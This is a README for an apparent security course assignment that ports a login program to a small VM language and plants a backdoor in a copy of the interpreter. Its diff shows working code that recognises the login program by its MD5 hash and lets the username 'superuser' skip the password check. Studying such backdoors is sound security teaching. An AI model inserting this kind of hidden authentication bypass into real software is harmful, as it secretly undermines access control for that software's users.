Mini-VM Backdoor
===============
by [mfaerevaag](github.com/mfaerevaag)

## Contents
 * [login/login.mini](login/login.mini): A port of the C login-snippet.
 * [test/test.mini](test/test.mini): Random test program in Mini Lang.
 * [test/test.md](test/test.md): Description of test program,
   including input/output and pseudocode.
 * [backdoor/](backdoor/): Directory containing copy of interpreter
   ([interpreter/](interpreter/)), *with* backdoor.
 * [compiler/](compiler/): Improved compiler! See section below for
   description.

### `login/`
Directory containing the login program, `login.mini`. A simple
overview of its logical flow is:

  1. Initialize constants (0 and 1)
  2. Initialize strings (`"Failure\n\0"` and `"Success\n\0"`)
  3. Write username prompt to memory
  4. Get username
  5. Check if they match
  6. Write password prompt to memory
  7. Get password
  8. Check if they match
  9. Write feedback message

### `test/`
In the `test` directory you will find my example program, a small
program computing Fibonacci numbers. More information is found in
its [separate write-up](test/test.md).

### `backdoor/`
The backdoor has been implemented by infecting the `gets` instruction,
as seen in the diff below. The `gets` instruction now checks if the
hash of its bytecode matches a hardcoded hash, which is the login
program (`md5sum build/login.bc`). If the hash matches it check the
input string for the "superuser" key. Again, if it matches it modifies
the program counter to go straight to the successful state.

```diff
237a238,255
>     // Backdoor
>     ///////////////////////////////////////////////////////
>     // Hash of login program
>     const unsigned char hash[] = { 0x2c, 0x3c, 0xb4, 0x81,
>                                    0x52, 0xc2, 0x3c, 0xb6,
>                                    0x4b, 0xb2, 0xfb, 0x0f,
>                                    0x24, 0x86, 0x0c, 0xac };
>
>     // Check if hash matches
>     if (memcmp(hash, bytecode_hash, MD5_DIGEST_LENGTH) == 0) {
>         // If match, check for magic username
>         if (strcmp(buf, "superuser") == 0) {
>             // Jump past password prompt
>             ctx->pc = 169 - 1;  /* compensate for increment */
>         }
>     }
>     ////////////////////////////////////////////////////////
```

### `compiler/`
Only change to compiler is a correction of a type, which has been
submitted as
a [pull request](https://github.com/KAIST-IS521/mini-vm/pull/4).

## Learned
From this activity I have gotten to refresh my experience on virtual
machines and writing assembly like code. I have previously had
experience with writing assembly code for stack based machines, but
not much with register based machines. This has made the activity very
interesting and fun!
